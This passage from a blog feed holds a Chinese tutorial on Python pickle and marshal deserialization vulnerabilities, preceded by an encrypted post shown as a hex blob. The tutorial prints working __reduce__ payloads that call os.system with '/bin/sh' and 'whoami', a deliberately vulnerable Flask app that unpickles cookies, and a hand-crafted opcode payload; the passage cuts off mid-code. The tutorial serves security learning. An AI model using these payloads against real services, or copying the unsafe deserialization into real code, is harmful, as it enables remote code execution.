e79793478f07c35fced176a5acdfd4e9be176925c49ed3f838334248b812592c85aa0b85dec55795afa6976a3d75a6308be21e07918285d7e8ea13606afb14b1f8f3f959ec754dad5a2983e42e9829598da2a8872ed23da05f3abc42d7b9b96189a2ebc0f931186fa887d3706fdaec59f332af02887fe875d6f2f9ab716463f4c09b19f5f19154fa6ed894c40c78318e35e9445eab501ae953aa8526a210ceadbee1c5945eb197ca99af2301ec025a531fc0d41876c563649ed67cd87bc1b522e02f13f496d482962ab5073a60be3753c1067a52a8336213eff64df52ae86136a89cb3e845b6353a95440f88742aad6ac79f530cab5eda0fe03815d9ca366af933500935c26fbec319abf0ead8a415657739adac8a00732d02439b05c40ec75eddadb312f6c2221431dffae8ddba3b531a4efb10e81678b79bc6850a2635e9360956db8f6e040e9fdfe55e550c57cadd2783959bca4f8194f20f9b3dd12651a577ff198016272d8b5e13dace678c5132aacb6ad330b52891264f34418cb9af3ef35edb0f58df30da2eafd9707590a71b53e20b8bda424211bd1fe51bf69f5705ab4d648887c0019cb132f35c1e93b374d1bb72e4d1bd7ab52a4f14458ea5d85fcd98117864ae831b06640b3934a7313daf9d0b3eb61214e051456e99fa1381f573e28da31a26a65d2750eda714479b010ab5ce817646b6d27a86e9def63deb8072694519c20f78f8a18787eb7fe25a480061a5c22e5a98ad6162ab6bcd72dcc6ad70fffe80e76a43abb3d5f9e6da9affdded6e53fe8d8fc9eb274327331fc692878ab118eb32383f95002ee07b23868e731b653be785671dc423aefc3ecade821634edf09bb8f22ea0e8aaf00f22ccf25034ee976634cb0c4cf78a9aab9b5920e0ede4f78687aeb991d72114b9095c6d438fab54f6144991754d1da5544a0b3805d67646893393e52a9ab37cc4c8e65d88ce91ee69e89405dcc7d8e3d0383734a484320fb0c199b3d3a67dd0eb605f9363a59e0276b8d82adf8eec20c72bb20a8c814fbd7b8e3000710339e137dd4e7efa9fda535f1c1148587bebc0bcfa88e5e4a9bdd45988119e681ec4c09f3f6162c873f5fa27e6ab1f2eee56f0d9fddd484353053a534416f98bbf86748fd97f3b561582b41619f28bd499f90a27fc7da83ee3955d33add7dc188703f2d63ea6459f9626e583dbafdd9e342de9c0da8bac86b2b452b6110adff39234ba166cffeb046a4b1f67b5940748230175105aaf563ff6a9d69b7afed64dd46a33eb391ee286bb7e68a0ec17001bfbaacec478059b012da021c575192a31e3291fd5c82c1e705b99c4473a1c3552e3caeb5caab2aed260a07cc027281038b37d1169eb792846adaf99e4390b0ce0e9cba1feeb362fe386cc76bca88a34c0c2dfedd99ec941c192a23f09c18db5e6ed368dbd04116ebd7fb1c3e99f85ad52af05a14eb565e1212b6cfdeb66204c2d058b719897e8465ab4967843d706a93360fc973e73f1da86b0abd6bf423a7b1f41b5c7c2f008fb49352fa2ad68b6a0e78812fb6379054d5acf092777b4680caae1d361357dfb8e8cc2714e5d54253082f32b06535d41c0d198f20b630e891132738586977087979f1ecc5e183ab0432f66c89eb11892792c9887df915d51e51e6c6b227a133bccdf6ce407a98e872ed07114a6296bf7bc99c6032935e06b80509a41b79eef44714e9ef84cdccd1e7736972094557889ad08058693a96f7f8b8fa197da1b875d46feedad9a53b6179c081af489bfd4f58d9306e2c32092049cd9b383a0e8384d6a63283f9ccb1a5a1cd1887aaf1f0041271552417322a531c9cc956232c86cb79bdb668032ad9f899245fccf60a808face2ea0554a25ddd7c0d3d6e1dc3069549d894b7cfcb97ba53f9b896a0ef69bfe048d82a5e5a56ad9f23a36fcf23145d4173b8a60065c363bfbaa6fc6d552c4f3afac0ea90a56560f1a0ac9681d05e3d4f75478f752d442f1d5a3eead57de71918d367fc46b733256439d13f86f147e338fa837e14f4ec4243e3041af241857adc71bbb4369eaf3f66370acd86a985cab117e7e85d8a1dafaf6dd06e0014cfda8fc200e64896f9f186a853d7e971d8897a054f3c84096d80a492e84a83c98ef85477083ae2635d8e50739d11e8a1869aee951202bb873be1110dc8c1e625a045ca76f9fb9b5368c33450054d493504d06fec54199cedd81eb94907f486125594c881fcdaf9013bc61265a1d35125f73bcda3c755cae7ded3c03a186c5f30c042859c4c8b49453261bc314009bbf37360fe04e8d0065899a120c5f245266dff988e0dc63cecfdb74c6b043e2dcb2caa01ed701b56ada02444bd5ddbddae62ef48a9d1bc2743936cb354b03f7d4b526f69b74394c2d26d8ffbfa512ea79a3672a4b2176b217359022fac4a2b99627c301428e7bfb12901f3a3f51634da15e0fadb8cc280d19cdbad7a144990c3f54fe21f72439ae1da722a7717608bba5eb14a90cf101c5879f7bf5152bd64a5028a86e6e05113388af28dd4c37fe22b1b1351eb2fc82829004c1c4dd1221a516cea8022c3e40aaf81cf3b331e7a601e73e7efd43ae108747892f350f8cfaf31ca1ddcf23126a7f1b90ed11224106639522bc3b939f70f717a81f6501aa03d6309dc2b3980bff44cfab85e73bf17390abbad978420a538dd260133488018c2d7f634ff68e7b3383e73c4943fd1442e8451092671d122ab07f550a68fa991d310be59c97803b9058db45c286620582641987e31cfa9f79b2d59be4cfdd2919cb13f7107d278d68e2c9da1d754a4265dbf80a25abf6952d1402a55594e0639d0239002c5d3ee4ff642de997a14fadaa2d49acb606d1323836f947fd9c7332245cf58e7e0611d64ae765f815a9772a71d95562f5b887d95061c2fc65a5edfd50d2469fbd4c06a73f521cfb3c7fcf9870f7f4e3b7a03964b6bb8e1d1d55d30770c692d4f1fb149ceb195b47460713f2772771a0cf907f2df110b9546c33fa04f006c8e19cbb5379a3b4237e210d8460f48b58485ca6ab7006331b37bf6ada7a194e8af04ff1893b5311d0866d798fdadd28c8b12243ca805c4cc686b6387c43c7f1dff1d4e26d7a0a981c58685d41622df57d45ce9b61f2a5f84e2695c4e042385937ff98f77043a274085f9c4d694d4042609b82c9f8128c3bfb81d1298c2b3daf357034963eead5317780f46ef405bb5e4f71fed19c488e9b17bfa233248d5b61db9daf192ac8ba9e3838a66fdd803f76c70161cc218cdf5cff4ae702e5efd38cf68d84d204fe36c1b290a21610c5a0b0ae7ca35f2ed9db6627b8bf9aa21a48178a43db79402ea246a73e2f59dff795f1705a20a607d8a91d21fd170983593dd1001834b1193674b6cf659a14594d73a669604c75116e58b23c857c5196efe833f134673a0b9173c5c4abdc2570a77e898c5d70295da5ea1f047ffc2a17e4c5e841f1b3931fea6fc304840f7b580ecacbc8096850defbddfe8ee5c4ee90a54fbd91234fa4696152fe465a65acb7a59e24f128ab3a4642a956dcf5353fc9bd7deb2cc18f982c6b5fc0311cc78680314840bbef8907ad0e223adcd0cabf7be5b9eda80f84f85cd43fe5a9b2a2a50e26dda490eef5d691d2076809df2238b3dd71acd9cdb7a3f2f5e2acdeeb9a10267b45a9e9140219f29012bb07b46b83183d22f6502af11b26aec90d5c2a6fe19293fc0a3d39a9c58739e388058295cdf844a7fb2fabbaca24a49d399f584f14996560dfd5617389e3323f5c6fccddba8115b6cce63a506ce68f798415ede8300181057e878d3ac7e0c018a6ae6f15b3b1d1a6f7afa4f177d023b7bc3ac012d9d8a7023a36adde137e20024199a305016ad4e7bd1f52281169f60c87eba555ac809ca6fe16efac38a62f896ee55754ab9df4aabd8429ca01aa36e36ac0a766b444dc317b50d206c6a7d18b452cfe62fef43215246978bb65a2b4f5c347086d5bd35b8cb4b5c8933a1623b151bd68c12e5e0002d0bb942dbb02e1e6ff1a3ab67c23907e480854ed25e050a6cc136d0bd9d05fe9c7e999fe0d0b45be17885a7fec7fbfcb46b810efa90f62bddd1a295db95ca256d0f7a323e302ab2d81d5f1e69560a93d4fa01f78eb8644803a3da76f99275bba8acc306e21a35cc0ced252a8ee61331cc1706b590015105c669f783a8b70408302ed51af84f13e1fc1251d57880b38d6e03e411220f0286a17707ffa640a468206725e33bc68b58f7afade027fdb72e6e7ad9e3fc62b5b615dc9a410c04cb82e16168aa3565033abee8cc9398a4db6105bcf24250e58ea1381ac57df73342c652d2a36c3ffe42e9c2fc3ffbe0de465f1fc0382a1f3f0e11c71ff80901b06925ae337e8fed04b4113844c3f7eca2192082acb5caacea32321f4d804193597d74b1500190e6ecb5ff2ef93abb96ca54f0bca10b22e4b027659e5331c06cf97b899d9b69a939f37390e74c6a5a0f8ac4763c3d90d4cbaae347d868bea21e847f7b03d4e7ffc4b5e419ac745546f9e4012eae1f6c94cf12e1f3f7583cf59a9910b066d766403a9845f9be43c0243833ac89dbf747e8ad2c6d001a7c3348ba601a5e1044c0700fd942533054e3f6bcfd9ee8f2efac623c764ad53df2d591c51350e880efcc83d2024d129d16157ed7bacd26975d23e621d8b3fc9a522f8b0ed0b825619ec193feeb9789ec05acab350409a787efa75dcd9163e08998a5cfeebb2303693e146d716a9e04c737c45f3408020551d31897f7ec2a0787317c07b7b014965c962dc575a43e666d1c7c206825d893c672e847ffe48557307a2abac64671149220858dd971603fb091eacbb0d8e257ed2959b096ce7c709608e6e6b2f79405c75d2b68d130ba182163cdcbeb8c4dee0368cff09de23bc4962666a0c7f7cf6e5af27844952a21ba1a0cb5c3cd0b42cbd0625c27ba371012cc75d8999b557d666c351d7eb2a41bc2bad1097ebaecabbe0f8441d5866d756eeda66ce8b262fd3c364f06d699c65058da163dd92a1db2f64d2ebf95eb733356afa1fcd7d23ad3ca772bd7682b0ba3af5295b6ba0d1883c4d08f003275d939c5eb314d034985bde50eb04f2466bf7a92baf1006579c20624a105d069ebdd98a79ac047d2d1c88fe9c7d1cffe58a7c25cdc7b57218650426aead3b170f4cd6579a97d0689ac07d95239fff79b30d26dba8b0d737b5642b1d840fe4fc1b118e2cbebcd0e3ba239027634282c93a2de57277dd9e2666d263fcdaa6212fc1df553e0fb9b3d9777f61f397182afd8846483b37754414fc891023e652c49cdd9be9600a02401aa046580e4571a72e1252b3d426077f578753879515d1ae29c46b584b99ff47bab9ac74f1a1501b606d7efc89c6328394f9bebd15b30c65d70ab172608f008e25f171aec309e13deaa14eb03e5e923e6c4fdc23b0af426e17553dcd27230ab4bfb4a87abd903fc626ad7fb804ac9114a1c7a4afbd53a45fa8b133d609fe495b1ca28ff69a90f5a0f9b5c75854f79e8f76f915ae5ff23a64a15cbe38e79883ffe68b090f79fc851e2920fe967e56dcdbede2880a456eb3b66eac9c44cc4c9bdd309a325196e4c25152314878c0ee3b40ad5581b6d8192fff7a339da5f067436c220825d102ce89b6fbc532f3d3af686391c0523df9c920762867ed0b2059c1b09c0de7bf32ac05b21c8875a77404baba3341198bb59961b5284dfc15274cd579e14895762ddcc19e82716cda8115b8b76c51d779af1339f759a443432b88e7e0d607a32fecac99c8329164e48ebdcf1decc6c9888ecb9ad76a81642b5b7dbf0dac0d4551e0d0bffbbf2c3d7e1cf381c87619bb8319ee782ac80eb9d68f14704a7248bdde326eb49965b83ce223a60004014cece7c7a1ee1ba0f30890d75e4d2b9a7930b9b2b9e68bcc33777c20a4e9d04314a7e16618194290b9214ede3a311397308a50e8d3db4f2ade5743a8de4e922928e6a5a8a184b9e310a2ee4038ae1f0ba78565104f61984d4d7c7781fb1cc4fb4350d400f854fbf22684f3eee2d1af1630a67c1f552fa353eae9b2b55c831b35713c63059cb9838ee2c78041e8e10bb5b3e23db8122afc463c4bd92d216905246cf095827e3d4f405d72efe164ecb460dbccb15bd4fae209d13ad7a93a2142e8bc2ea2eb58554e8807d3891d67af5e198e610434fe6aac462d972463eb65df89177705dc665e63bcd081b43378377b46edc7bce722b76a6050f542c35932ac7edf9922fdd6344de23d86d97c9ae32d5087d29ba8e0bfd0e1b99aa0490cfca5f60b4f534ade9337e159d0368ad1dae90ff0f9462e0b3eb14bd62ae28f17a426bb72a70bc97fc50164c3316393968d9f6623b0e271ec32411768200467e64a89fdbe6ffa418b0cdbd09ad2234975c1cb672cd8b724652a63cd29f7f397843c5eab00d677168682bf6c3ff32e0a84b63fc56bb2ea11cbbcf4ef16f82a9e52161efe00ee25a752bae8a8092b36ed93a07b4f00ea34a865d246e3c62bae161264cb21d1d822f401759322af92da74205dfa0f8c79b3a51422d3c7c8c16e0738ebe8bb4fc0b3d5d37b5b53a2f911869147c78e22848e677f8f844846ebdb3de69558b716533d8a89f367e1a364e11f1ec362132b61551ae369548a4faaafdb5e08d5f2398bf6bab2964964c8fb2306321ea562c39505afc59551f339a181b3081e6ffb7f4f316a8bf71dea1b132f101a8962f7a6f46ed406afd34b98ea1de85d7671a1253d41f25c8134905fa6d1f78c67a1302e59e59d71b440efa80d5aee3609288e427154dadb904ff46d3af9468a39c4be990843ee07441007f0add0762710d3457739b5babd060e115420fd433b38c9d2d9b5f79549e4518c26013065722c7905e8e7d9defa4590dd0a5484d9b4da8c54f9515f3fc604bb2035df68c50e49a9c63579f9a2e9a5fe9eb7fbaf9771d56d35d9912ed329e070b49cd16eca641ae2804d191162c9ad6ab1813ad42b03f9fa627e637b6ed0d9e1aa0d6ffaa84e774dd08948b84907050b5343a02419164adbc69bf80053e23df3230e916362f7c4e645fa0ef0200b03c81f0ec8c2c308be97c77eb44eedf3b0499bd34fcc821b622393e054ef55d0ccbd50b9364279df6446ec139c4c1b1a54d093490237358fef86188d063f31a5562216892a5bd6abc574241c926bf9d10f77dd64d4d20c1887e0acdd00fa36bf4b2f918860bc70a0ebff0e6842cad07b0683566f3c26219089e7fd4b13abe166fe331781e46b8ccbc9685401c36c7549dda09f4f1f57a3fc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Python反序列化漏洞</title>
    <link href="http://ca0y1h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://ca0y1h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-03T13:19:56.000Z</published>
    <updated>2021-01-03T13:20:48.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python反序列化漏洞">Python反序列化漏洞</h1><p>这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等等，Python相对而言没有PHP那么灵活，关于反序列化漏洞的话比较容易理解，主要涉及这么几个概念：pickle，pvm，<code>__reduce__</code>魔术方法。</p><p>K0rz3n师傅的文章已经讲的极为透彻了，我就搬运总结学习一下。</p><h2 id="0x01-python序列化和反序列化">0x01 python序列化和反序列化</h2><h3 id="序列化">序列化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><p>python3的输出：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202644.png" alt=""></p><p>python2的输出：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202846.png" alt=""></p><p>虽然看起来有点难理解，但是还是可以清楚地看到我们对象的属性 name ca01h，我们对象所属的类 people 都已近存储在里面了。</p><h3 id="反序列化">反序列化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">d = pickle.loads(c)</span><br><span class="line">d.say()</span><br></pre></td></tr></table></figure><p>无论python2还是python3，输出的都是<code>Hello ! My friends</code>，也就是说我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法。</p><h2 id="0x02-反序列化漏洞">0x02 反序列化漏洞</h2><h3 id="漏洞常见出现地方">漏洞常见出现地方</h3><p><strong>1.通常在解析认证token，session的时候</strong></p><p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p><p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p><p><strong>3.可能将对象Pickle后在网络中传输。</strong></p><p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p><h3 id="漏洞利用方式">漏洞利用方式</h3><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p><p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p><p>show code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204054.png" alt=""></p><p>稍微解释一下这几个指令：</p><ul><li>S : 后面跟的是字符串</li><li>( ：作为命令执行到哪里的一个标记</li><li>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</li><li>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</li><li>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中</li><li>. ：点号是结束符</li></ul><p>另外p0 p1 p2 p3只是标签，对命令我们的payload没有任何影响。</p><p>我们让上面这个结果进行反序列化看一下结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204400.png" alt=""></p><p>再来看一个最简单的利用方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>很明显，反序列化的参数是可控的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">             <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">      </span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br></pre></td></tr></table></figure><h2 id="0x03-Marshal反序列化">0x03 Marshal反序列化</h2><p>现在看看还有啥别的序列化库。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103205604.png" alt=""></p><p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，这个时候就需要自己构造opcode。</p><p>这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))</span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, globals(), <span class="string">&#x27;&#x27;</span>)()</span><br><span class="line">print(code_unserialized)</span><br></pre></td></tr></table></figure><p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&#39;YwAAA...&#39;           #code对象序列化编码</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&#39;&#39;</span><br><span class="line">tR(tR.</span><br></pre></td></tr></table></figure><p>利用方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">return</span> os.system(<span 